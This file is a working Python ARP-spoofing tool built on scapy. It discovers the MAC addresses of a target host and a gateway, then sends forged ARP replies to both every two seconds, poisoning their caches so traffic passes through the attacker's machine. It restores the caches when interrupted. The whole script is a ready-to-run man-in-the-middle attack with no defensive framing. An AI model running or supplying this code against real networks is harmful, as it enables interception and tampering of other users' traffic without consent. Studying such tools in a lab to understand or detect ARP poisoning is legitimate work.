#!/usr/bin/env python

import scapy.all as scapy
import optparse
import time


def restore(target_ip, spoof_ip, mac_of_target, spoof_mac):
    if target_ip is not None and spoof_ip is not None and mac_of_target is not None and spoof_mac is not None:
        packet = scapy.ARP(op=2, hwsrc=spoof_mac, psrc=spoof_ip, hwdst=mac_of_target, pdst=target_ip)
        scapy.send(packet, verbose=False)


def spoof(target_ip, spoof_ip, mac_of_target):
    if target_ip is not None and spoof_ip is not None and mac_of_target is not None:
        packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwdst=mac_of_target)
        scapy.send(packet, verbose=False)


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="Target IP to spoof")
    parser.add_option("-i", "--interface", dest="interface", help="Interface of the attack")
    parser.add_option("-g", "--gateway", dest="gateway", help="")
    user_options = parser.parse_args()[0]
    if not user_options.target:
        print("[-] Please specify target ip, refer --help for more information")
    if not user_options.interface:
        print("[-] Please specify target interface, refer --help for more information")
    if not user_options.gateway:
        print("[-] Please specify gateway ip, refer --help for more information")
    return user_options


def scan(ip, interface):
    if ip is not None and interface is not None:
        arp_request = scapy.ARP(pdst=ip)  # Creating an arp request packet asking which device has the target ip
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # Creating an Ether packet to broadcast to the broadcast mac
        arp_request_broadcast = broadcast / arp_request  # Merging the arp & broadcast packets into a single packet
        answered_list = scapy.srp(arp_request_broadcast, timeout=2, iface=interface, inter=0.1, verbose=False)[
            0]  # Storing the responses of broadcast
        return answered_list[0][1].hwsrc


options = get_arguments()
gateway_mac = scan(options.gateway, options.interface)
target_mac = scan(options.target, options.interface)

packets_sent = 0
print("[+] Starting ARP Spoofer")
try:
    while True:
        spoof(options.target, options.gateway, target_mac)
        spoof(options.gateway, options.target, gateway_mac)
        packets_sent += 2
        print("\r[+] Packets sent: " + str(packets_sent), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[!] Detected Keyboard Interrupt")
    print("[+] Restoring IP tables, please wait")
    try:
        restore(options.target, options.gateway, target_mac, gateway_mac)
        restore(options.gateway, options.target, gateway_mac, target_mac)
        print("[+] IP tables restored successfully")
    except:
        print("[-] Could not restore IP tables")
